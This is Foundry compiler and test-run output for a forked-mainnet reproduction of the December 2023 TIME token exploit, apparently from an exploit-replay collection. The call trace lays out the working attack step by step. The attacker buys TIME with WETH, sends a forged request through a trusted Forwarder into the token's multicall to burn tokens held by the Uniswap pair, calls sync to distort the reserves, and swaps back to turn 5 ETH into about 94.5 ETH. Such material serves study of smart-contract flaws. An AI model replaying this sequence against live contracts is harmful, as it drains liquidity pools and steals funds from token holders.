Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-12/TIME_exp.sol:43:5:
   |
43 |     IWETH private constant WETH =
   |     ^ (Relevant source part starts here and spans across multiple lines).
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 236.39ms (267.43µs CPU time)

Ran 1 test for src/test/2023-12/TIME_exp.sol:ContractTest
[PASS] testExploit() (gas: 291614)
Logs:
  Exploiter ETH balance before attack: 5.000000000000000000
  Exploiter ETH balance after attack: 94.513462587046838316

Traces:
  [359714] ContractTest::testExploit()
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18])
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Exploiter ETH balance before attack", val: 5000000000000000000 [5e18], decimals: 18)
    ├─ [29647] TIME::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [26969] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [24420] WETH::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [23974] WETH::deposit{value: 5000000000000000000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 5000000000000000000 [5e18])
    │   └─ ← [Stop] 
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5000000000000000000 [5e18]
    ├─ [94410] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(5000000000000000000 [5e18], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701905307 [1.701e9])
    │   ├─ [8225] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 5000000000000000000 [5e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], value: 5000000000000000000 [5e18])
    │   │   └─ ← [Return] true
    │   ├─ [2798] TIME::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [2626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2504] TIME_WETH::getReserves() [staticcall]
    │   │   └─ ← [Return] 65692658856160314505008470321 [6.569e28], 89787809617954054780 [8.978e19], 1701389183 [1.701e9]
    │   ├─ [534] WETH::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   └─ ← [Return] 94787809617954054780 [9.478e19]
    │   ├─ [69859] TIME_WETH::swap(3455399346269045701666911322 [3.455e27], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [37204] TIME::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3455399346269045701666911322 [3.455e27])
    │   │   │   ├─ [37026] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3455399346269045701666911322 [3.455e27]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3455399346269045701666911322 [3.455e27])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [798] TIME::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [delegatecall]
    │   │   │   │   └─ ← [Return] 62237259509891268803341558999 [6.223e28]
    │   │   │   └─ ← [Return] 62237259509891268803341558999 [6.223e28]
    │   │   ├─ [534] WETH::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   │   └─ ← [Return] 94787809617954054780 [9.478e19]
    │   │   ├─ emit Sync(reserve0: 62237259509891268803341558999 [6.223e28], reserve1: 94787809617954054780 [9.478e19])
    │   │   ├─ emit Swap(sender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 5000000000000000000 [5e18], amount0Out: 3455399346269045701666911322 [3.455e27], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [798] TIME::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   └─ ← [Return] 3455399346269045701666911322 [3.455e27]
    │   │   └─ ← [Return] 3455399346269045701666911322 [3.455e27]
    │   └─ ← [Stop] 
    ├─ [3000] PRECOMPILES::ecrecover(0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6, 27, 65847907045785360296324369037753572276712477681648530293081197803666264345077, 8014027068490085741275661760746077238879405461533119087921122232888442787014) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000a16a5f37774309710711a8b4e83b068306b21724
    ├─ [0] VM::assertEq(recoverAddr: [0xa16A5F37774309710711a8B4E83b068306b21724], recoverAddr: [0xa16A5F37774309710711a8B4E83b068306b21724]) [staticcall]
    │   └─ ← [Return] 
    ├─ [77668] Forwarder::execute(ForwardRequest({ from: 0xa16A5F37774309710711a8B4E83b068306b21724, to: 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29, value: 0, gas: 5000000 [5e6], nonce: 0, data: 0xac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf840000000000000000 }), 0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f511b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c61b)
    │   ├─ [3000] PRECOMPILES::ecrecover(0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6, 27, 65847907045785360296324369037753572276712477681648530293081197803666264345077, 8014027068490085741275661760746077238879405461533119087921122232888442787014) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000a16a5f37774309710711a8b4e83b068306b21724
    │   ├─ [46447] TIME::multicall([0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84])
    │   │   ├─ [46236] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::multicall([0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84]) [delegatecall]
    │   │   │   ├─ [43617] TIME::burn(62227259510000000000000000000 [6.222e28]) [delegatecall]
    │   │   │   │   ├─ [43448] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::burn(62227259510000000000000000000 [6.222e28]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], to: 0x0000000000000000000000000000000000000000, value: 62227259510000000000000000000 [6.222e28])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   └─ ← [Return] [0x]
    │   │   └─ ← [Return] [0x]
    │   └─ ← [Return] true, 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    ├─ [7850] TIME_WETH::sync()
    │   ├─ [798] TIME::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [delegatecall]
    │   │   │   └─ ← [Return] 9999999891268803341558999 [9.999e24]
    │   │   └─ ← [Return] 9999999891268803341558999 [9.999e24]
    │   ├─ [534] WETH::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   └─ ← [Return] 94787809617954054780 [9.478e19]
    │   ├─ emit Sync(reserve0: 9999999891268803341558999 [9.999e24], reserve1: 94787809617954054780 [9.478e19])
    │   └─ ← [Stop] 
    ├─ [798] TIME::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 3455399346269045701666911322 [3.455e27]
    │   └─ ← [Return] 3455399346269045701666911322 [3.455e27]
    ├─ [53045] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(3455399346269045701666911322 [3.455e27], 0, [0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701905307 [1.701e9])
    │   ├─ [6932] TIME::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 3455399346269045701666911322 [3.455e27])
    │   │   ├─ [6748] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], 3455399346269045701666911322 [3.455e27]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], value: 3455399346269045701666911322 [3.455e27])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] TIME_WETH::getReserves() [staticcall]
    │   │   └─ ← [Return] 9999999891268803341558999 [9.999e24], 94787809617954054780 [9.478e19], 1701904307 [1.701e9]
    │   ├─ [798] TIME::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [delegatecall]
    │   │   │   └─ ← [Return] 3465399346160314505008470321 [3.465e27]
    │   │   └─ ← [Return] 3465399346160314505008470321 [3.465e27]
    │   ├─ [36601] TIME_WETH::swap(0, 94513462587046838316 [9.451e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [23162] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 94513462587046838316 [9.451e19])
    │   │   │   ├─ emit Transfer(from: TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 94513462587046838316 [9.451e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [798] TIME::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   │   ├─ [626] 0x303A41300BAEb37A1028Af017B17B8A6edC3066a::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [delegatecall]
    │   │   │   │   └─ ← [Return] 3465399346160314505008470321 [3.465e27]
    │   │   │   └─ ← [Return] 3465399346160314505008470321 [3.465e27]
    │   │   ├─ [534] WETH::balanceOf(TIME_WETH: [0x760dc1E043D99394A10605B2FA08F123D60faF84]) [staticcall]
    │   │   │   └─ ← [Return] 274347030907216464 [2.743e17]
    │   │   ├─ emit Sync(reserve0: 3465399346160314505008470321 [3.465e27], reserve1: 274347030907216464 [2.743e17])
    │   │   ├─ emit Swap(sender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 3455399346269045701666911322 [3.455e27], amount1In: 0, amount0Out: 0, amount1Out: 94513462587046838316 [9.451e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 94513462587046838316 [9.451e19]
    │   └─ ← [Stop] 
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 94513462587046838316 [9.451e19]
    ├─ [9195] WETH::withdraw(94513462587046838316 [9.451e19])
    │   ├─ [55] ContractTest::receive{value: 94513462587046838316}()
    │   │   └─ ← [Stop] 
    │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 94513462587046838316 [9.451e19])
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Exploiter ETH balance after attack", val: 94513462587046838316 [9.451e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 306.10ms (7.54ms CPU time)

Ran 2 test suites in 308.10ms (542.49ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
